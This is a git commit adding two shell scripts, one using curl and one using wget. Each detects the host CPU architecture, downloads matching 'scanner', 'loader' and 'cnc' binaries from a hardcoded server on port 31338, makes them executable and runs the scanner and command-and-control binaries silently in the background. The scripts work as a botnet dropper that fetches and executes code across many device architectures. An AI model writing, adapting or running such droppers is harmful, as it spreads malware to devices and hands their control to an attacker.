e8e728c64887112849c90a618c5be4ce828bf9a3
tony12305449 <tony12305449@gmail.com>
2023-08-10 11:30:18 +0800

    backup update

---
+++ ELF_file/backup/curl_download_exec.sh
@@ -0,0 +1,94 @@
+#!/bin/sh
+
+arch=$(uname -m | awk '{print tolower($0)}')
+ip="192.168.1.97:31338"
+
+if echo "$arch" | grep -qiE 'x86_64|amd64'; then
+    curl "http://$ip/amd64_scanner" -o scanner
+elif echo "$arch" | grep -qiE 'i386|386'; then
+    curl "http://$ip/386_scanner" -o scanner
+elif echo "$arch" | grep -qiE 'armv8|arm64|aarch64'; then
+    curl "http://$ip/arm64_scanner" -o scanner
+elif echo "$arch" | grep -qiE 'arm'; then
+    curl "http://$ip/arm_scanner" -o scanner
+elif echo "$arch" | grep -qiE 'mips64le'; then 
+    curl "http://$ip/mips64le_scanner" -o scanner
+elif echo "$arch" | grep -qiE 'mips64'; then 
+    curl "http://$ip/mip64_scanner" -o scanner
+elif echo "$arch" | grep -qiE 'mips'; then
+    curl "http://$ip/mips_scanner" -o scanner
+elif echo "$arch" | grep -qiE 'loong64'; then
+    curl "http://$ip/loong64_scanner" -o scanner
+elif echo "$arch" | grep -qiE 'ppc64le'; then
+    curl "http://$ip/ppc64le_scanner" -o scanner
+elif echo "$arch" | grep -qiE 'ppc64'; then
+    curl "http://$ip/ppc64_scanner" -o scanner
+elif echo "$arch" | grep -qiE 'riscv64'; then
+    curl "http://$ip/riscv64_scanner" -o scanner
+else
+    exit
+fi
+while [ ! -f scanner ]; do
+    sleep 1
+done
+if echo "$arch" | grep -qiE 'x86_64|amd64'; then
+    curl "http://$ip/amd64_loader" -o loader
+elif echo "$arch" | grep -qiE 'i386|386'; then
+    curl "http://$ip/386_loader" -o loader
+elif echo "$arch" | grep -qiE 'armv8|arm64|aarch64'; then
+    curl "http://$ip/arm64_loader" -o loader
+elif echo "$arch" | grep -qiE 'arm'; then
+    curl "http://$ip/arm_loader" -o loader
+elif echo "$arch" | grep -qiE 'mips64le'; then 
+    curl "http://$ip/mips64le_loader" -o loader
+elif echo "$arch" | grep -qiE 'mips64'; then 
+    curl "http://$ip/mip64_loader" -o loader
+elif echo "$arch" | grep -qiE 'mips'; then
+    curl "http://$ip/mips_loader" -o loader
+elif echo "$arch" | grep -qiE 'loong64'; then
+    curl "http://$ip/loong64_loader" -o loader
+elif echo "$arch" | grep -qiE 'ppc64le'; then
+    curl "http://$ip/ppc64le_loader" -o loader
+elif echo "$arch" | grep -qiE 'ppc64'; then
+    curl "http://$ip/ppc64_loader" -o loader
+elif echo "$arch" | grep -qiE 'riscv64'; then
+    curl "http://$ip/riscv64_loader" -o loader
+else
+    exit
+fi
+while [ ! -f scanner ]; do
+    sleep 1
+done
+if echo "$arch" | grep -qiE 'x86_64|amd64'; then
+    curl "http://$ip/amd64_cnc" -o cnc
+elif echo "$arch" | grep -qiE 'i386|386'; then
+    curl "http://$ip/386_cnc" -o cnc
+elif echo "$arch" | grep -qiE 'armv8|arm64|aarch64'; then
+    curl "http://$ip/arm64_cnc" -o cnc
+elif echo "$arch" | grep -qiE 'arm'; then
+    curl "http://$ip/arm_cnc" -o cnc
+elif echo "$arch" | grep -qiE 'mips64le'; then 
+    curl "http://$ip/mips64le_cnc" -o cnc
+elif echo "$arch" | grep -qiE 'mips64'; then 
+    curl "http://$ip/mip64_cnc" -o cnc
+elif echo "$arch" | grep -qiE 'mips'; then
+    curl "http://$ip/mips_cnc" -o cnc
+elif echo "$arch" | grep -qiE 'loong64'; then
+    curl "http://$ip/loong64_cnc" -o cnc
+elif echo "$arch" | grep -qiE 'ppc64le'; then
+    curl "http://$ip/ppc64le_cnc" -o cnc
+elif echo "$arch" | grep -qiE 'ppc64'; then
+    curl "http://$ip/ppc64_cnc" -o cnc
+elif echo "$arch" | grep -qiE 'riscv64'; then
+    curl "http://$ip/riscv64_cnc" -o cnc
+else
+    exit
+fi
+while [ ! -f cnc ]; do
+    sleep 1
+done
+chmod +x scanner
+chmod +x loader
+chmod +x cnc
+./scanner > /dev/null 2>&1 &
+./cnc  > /dev/null 2>&1 &
---
+++ ELF_file/backup/wget_download_exec.sh
@@ -0,0 +1,101 @@
+#!/bin/sh
+
+arch=$(uname -m | awk '{print tolower($0)}')
+ip="192.168.1.97:31338"
+
+if echo "$arch" | grep -qiE 'x86_64|amd64'; then
+    wget "http://$ip/amd64_scanner" -O scanner
+elif echo "$arch" | grep -qiE 'i386|386'; then
+    wget "http://$ip/386_scanner" -O scanner
+elif echo "$arch" | grep -qiE 'armv8|arm64|aarch64'; then
+    wget "http://$ip/arm64_scanner" -O scanner
+elif echo "$arch" | grep -qiE 'arm'; then
+    wget "http://$ip/arm_scanner" -O scanner
+elif echo "$arch" | grep -qiE 'mips64le'; then 
+    wget "http://$ip/mips64le_scanner" -O scanner
+elif echo "$arch" | grep -qiE 'mips64'; then 
+    wget "http://$ip/mip64_scanner" -O scanner
+elif echo "$arch" | grep -qiE 'mips'; then
+    wget "http://$ip/mips_scanner" -O scanner
+elif echo "$arch" | grep -qiE 'mipsle'; then
+    wget "http://$ip/mipsle_scanner" -O scanner
+elif echo "$arch" | grep -qiE 'loong64'; then
+    wget "http://$ip/loong64_scanner" -O scanner
+elif echo "$arch" | grep -qiE 'ppc64le'; then
+    wget "http://$ip/ppc64le_scanner" -O scanner
+elif echo "$arch" | grep -qiE 'ppc64'; then
+    wget "http://$ip/ppc64_scanner" -O scanner
+elif echo "$arch" | grep -qiE 'riscv64'; then
+    wget "http://$ip/riscv64_scanner" -O scanner
+else
+    exit
+fi
+while [ ! -f scanner ]; do
+    sleep 1
+done
+if echo "$arch" | grep -qiE 'x86_64|amd64'; then
+    wget "http://$ip/amd64_loader" -O loader
+elif echo "$arch" | grep -qiE 'i386|386'; then
+    wget "http://$ip/386_loader" -O loader
+elif echo "$arch" | grep -qiE 'armv8|arm64|aarch64'; then
+    wget "http://$ip/arm64_loader" -O loader
+elif echo "$arch" | grep -qiE 'arm'; then
+    wget "http://$ip/arm_loader" -O loader
+elif echo "$arch" | grep -qiE 'mips64le'; then 
+    wget "http://$ip/mips64le_loader" -O loader
+elif echo "$arch" | grep -qiE 'mips64'; then 
+    wget "http://$ip/mip64_loader" -O loader
+elif echo "$arch" | grep -qiE 'mipsle'; then
+    wget "http://$ip/mipsle_loader" -O loader
+elif echo "$arch" | grep -qiE 'mips'; then
+    wget "http://$ip/mips_loader" -O loader
+elif echo "$arch" | grep -qiE 'loong64'; then
+    wget "http://$ip/loong64_loader" -O loader
+elif echo "$arch" | grep -qiE 'ppc64le'; then
+    wget "http://$ip/ppc64le_loader" -O loader
+elif echo "$arch" | grep -qiE 'ppc64'; then
+    wget "http://$ip/ppc64_loader" -O loader
+elif echo "$arch" | grep -qiE 'riscv64'; then
+    wget "http://$ip/riscv64_loader" -O loader
+else
+    exit
+fi
+while [ ! -f loader ]; do
+    sleep 1
+done
+
+if echo "$arch" | grep -qiE 'x86_64|amd64'; then
+    wget "http://$ip/amd64_cnc" -O cnc
+elif echo "$arch" | grep -qiE 'i386|386'; then
+    wget "http://$ip/386_cnc" -O cnc
+elif echo "$arch" | grep -qiE 'armv8|arm64|aarch64'; then
+    wget "http://$ip/arm64_cnc" -O cnc
+elif echo "$arch" | grep -qiE 'arm'; then
+    wget "http://$ip/arm_cnc" -O cnc
+elif echo "$arch" | grep -qiE 'mips64le'; then 
+    wget "http://$ip/mips64le_cnc" -O cnc
+elif echo "$arch" | grep -qiE 'mips64'; then 
+    wget "http://$ip/mip64_cnc" -O cnc
+elif echo "$arch" | grep -qiE 'mipsle'; then
+    wget "http://$ip/mipsle_cnc" -O cnc
+elif echo "$arch" | grep -qiE 'mips'; then
+    wget "http://$ip/mips_cnc" -O cnc
+elif echo "$arch" | grep -qiE 'loong64'; then
+    wget "http://$ip/loong64_cnc" -O cnc
+elif echo "$arch" | grep -qiE 'ppc64le'; then
+    wget "http://$ip/ppc64le_cnc" -O cnc
+elif echo "$arch" | grep -qiE 'ppc64'; then
+    wget "http://$ip/ppc64_cnc" -O cnc
+elif echo "$arch" | grep -qiE 'riscv64'; then
+    wget "http://$ip/riscv64_cnc" -O cnc
+else
+    exit
+fi
+while [ ! -f cnc ]; do
+    sleep 1
+done
+chmod +x scanner
+chmod +x loader
+chmod +x cnc
+./scanner > /dev/null 2>&1 &
+./cnc > /dev/null 2>&1 &
